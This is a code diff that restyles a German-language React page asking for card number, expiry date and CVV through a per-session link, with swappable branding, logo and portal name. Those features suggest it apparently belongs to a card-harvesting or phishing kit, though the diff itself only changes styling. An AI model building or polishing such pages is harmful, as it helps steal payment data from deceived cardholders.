@@ -140,8 +140,8 @@ export function CardClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="pak-page-shell">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -150,9 +150,9 @@ export function CardClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="pak-page-shell">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
-          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+      <div className="a3d-shell items-center justify-center p-4">
+        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
+          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
             Ungueltiger Link.
           </p>
         </div>
@@ -161,54 +161,57 @@ export function CardClient({ sessionId }: Props) {
   }
 
   return (
-    <div className="pak-page-shell">
-      <div className="pak-form-card w-full max-w-[860px] fade-in">
-        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
-          <div className="flex items-start justify-between gap-3">
-            <div className="min-w-0 max-w-[29rem]">
-              <h2 className="pak-form-title">{settings.card_title}</h2>
-              <p className="pak-form-subtitle mt-2">{settings.card_subtitle}</p>
+    <div className="a3d-shell">
+      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
+      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
+
+      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
+        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
+          <div className="mb-6 flex items-start justify-between gap-4">
+            <div className="min-w-0">
+              <h2 className="a3d-title text-[24px] leading-tight">{settings.card_title}</h2>
+              <p className="a3d-sub mt-2 text-sm font-medium">{settings.card_subtitle}</p>
             </div>
             <img
               src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
               alt={settings.portal_name || "Brand"}
-              className="pak-form-brand-logo shrink-0"
+              className="h-11 w-11 shrink-0 object-contain"
               id="card-brand-logo"
             />
           </div>
 
-          <form onSubmit={handleSubmit} className="mt-5 space-y-4 sm:mt-6 sm:space-y-5">
-            <label className="pak-form-label">
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <label className="block text-[13px] font-semibold text-[#344054]">
               {settings.card_number_label}
-              <div className="pak-form-input-wrap">
-                <div className="pak-form-input-icon">
-                  <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+              <div className="relative mt-2">
+                <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
+                  <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                     <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                     <path d="M3 10.5h18" />
                   </svg>
                 </div>
                 <input
                   inputMode="numeric"
-                  className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.18em]"
+                  className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.18em]"
                   value={number}
                   onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                   autoComplete="cc-number"
                 />
               </div>
             </label>
-            <div className="grid grid-cols-2 gap-4 sm:gap-6">
-              <label className="pak-form-label">
+            <div className="grid grid-cols-2 gap-3">
+              <label className="block text-[13px] font-semibold text-[#344054]">
                 {settings.card_expiry_label}
-                <div className="pak-form-input-wrap">
-                  <div className="pak-form-input-icon">
-                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                <div className="relative mt-2">
+                  <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
+                    <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                       <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
                       <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
                     </svg>
                   </div>
                   <input
                     placeholder="MM/YY"
-                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg"
+                    className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg"
                     value={expiry}
                     onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                     autoComplete="cc-exp"
@@ -217,11 +220,11 @@ export function CardClient({ sessionId }: Props) {
                   />
                 </div>
               </label>
-              <label className="pak-form-label">
+              <label className="block text-[13px] font-semibold text-[#344054]">
                 {settings.card_cvv_label}
-                <div className="pak-form-input-wrap">
-                  <div className="pak-form-input-icon">
-                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                <div className="relative mt-2">
+                  <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
+                    <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                       <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                       <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
                     </svg>
@@ -229,7 +232,7 @@ export function CardClient({ sessionId }: Props) {
                   <input
                     inputMode="numeric"
                     maxLength={4}
-                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.14em]"
+                    className="a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.14em]"
                     value={cvc}
                     onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                     autoComplete="cc-csc"
@@ -239,34 +242,34 @@ export function CardClient({ sessionId }: Props) {
             </div>
 
             {!expiryValid && expiry.length > 0 ? (
-              <p className="text-xs text-red-400">Das Ablaufdatum muss im Format MM/JJ sein.</p>
+              <p className="text-xs font-medium text-red-500">Das Ablaufdatum muss im Format MM/JJ sein.</p>
             ) : null}
 
             {!cvcValid && cvc.length > 0 ? (
-              <p className="text-xs text-red-400">Die CVV muss 3 oder 4 Ziffern enthalten.</p>
+              <p className="text-xs font-medium text-red-500">Die CVV muss 3 oder 4 Ziffern enthalten.</p>
             ) : null}
 
-            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}
 
-            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
-              <div className="pak-form-security">
-                <svg className="h-9 w-9 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
-                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
+            <button
+              type="submit"
+              disabled={saving || !expiryValid || !cvcValid}
+              className="a3d-btn w-full px-6 py-4 text-[16px]"
+            >
+              {saving ? "Wird gesendet..." : settings.card_button}
+            </button>
+
+            <div className="flex justify-center pt-1">
+              <div className="a3d-pill">
+                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
                 <span>Ihre Daten werden sicher verarbeitet.</span>
               </div>
-
-              <button
-                type="submit"
-                disabled={saving || !expiryValid || !cvcValid}
-                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
-              >
-                {saving ? "Wird gesendet..." : settings.card_button}
-              </button>
             </div>
           </form>
         </div>
-      </div>
+      </main>
     </div>
   );
 }
